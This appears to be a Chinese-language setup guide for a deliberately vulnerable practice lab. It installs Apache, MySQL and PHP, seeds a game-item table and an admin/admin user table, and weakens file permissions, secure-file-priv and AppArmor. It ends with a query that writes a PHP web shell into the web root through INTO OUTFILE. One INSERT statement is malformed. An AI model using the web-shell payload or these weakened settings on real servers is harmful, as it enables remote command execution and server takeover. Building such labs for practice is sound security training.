# sql

## 安裝Apache

執行：

$ sudo apt install apache2

檢查Apache是否正常運行：

$ sudo systemctl status apache2


## 安裝MySQL
執行

$ sudo apt install mysql-server

設定MySQL root user的密碼：

sudo mysql_secure_installation

改 root 密碼

ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'rootroot';

### 建db


```
create database  user_db;
use user_db;
```

* 創table item
```
CREATE TABLE `item` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `attack` int NOT NULL,
  `defense` int NOT NULL,
  PRIMARY KEY (`id`)
)
```
* item 資料
```
INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (1,'小李飛刀',100,323),
(`id`, `name`, `attack`, `defense`) VALUES (2,'屠龍刀',200,40),
(`id`, `name`, `attack`, `defense`) VALUES (3,'桃園盾',20,500),
(`id`, `name`, `attack`, `defense`) VALUES (4,'倚天劍',100,100),
(`id`, `name`, `attack`, `defense`) VALUES (5,'晨星虎斧',318,407),
(`id`, `name`, `attack`, `defense`) VALUES (6,'封魔流星破',247,50),
(`id`, `name`, `attack`, `defense`) VALUES (7,'霸虎風魔斬',469,54),
(`id`, `name`, `attack`, `defense`) VALUES (8,'修羅鬼噬爪',464,415),
(`id`, `name`, `attack`, `defense`) VALUES (9,'鬼噬日暮滅',327,401),
(`id`, `name`, `attack`, `defense`) VALUES (10,'洪流鳳火舞',378,485),
(`id`, `name`, `attack`, `defense`) VALUES (100,'彥宇大悲咒',2000,0);
```

* 創table user_table

```
CREATE TABLE `user_table` (
  `user_id` int NOT NULL AUTO_INCREMENT,
  `user_name` varchar(40) NOT NULL,
  `user_password` varchar(40) NOT NULL,
  `user_note` varchar(40) NOT NULL,
  PRIMARY KEY (`user_id`)
)
```

* user_table 資料
```

INSERT INTO `user_table`(`user_id`, `user_name`, `user_password`, `user_note`) VALUES(1,'admin','admin','root')
```

## php

```
sudo apt install php libapache2-mod-php php-mysql
```

## 下載 html.zip

放到 /var/www/html

利用  nautilus 改

sql 資料夾 
Owner: www-data   C&D
Group: www-data   C&D
other:            C&D

upfiles 資料夾 
Owner: mysql   C&D
Group: mysql   C&D
other:         C&D

修改outfile問題

SHOW GLOBAL VARIABLES LIKE '%secure%';
sudo find /* -name my.cnf
secure-file-priv = "/"


sudo nano /etc/apparmor.d/local/usr.sbin.mysqld 

/var/www/html/upfiles/ r,
/var/www/html/upfiles/** rw,

sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.mysqld 

測試outfile
select 1,2,3,"<?php echo shell_exec($_GET['cmd']) ?>"  from item into outfile "/var/www/html/upfiles/shell.php";
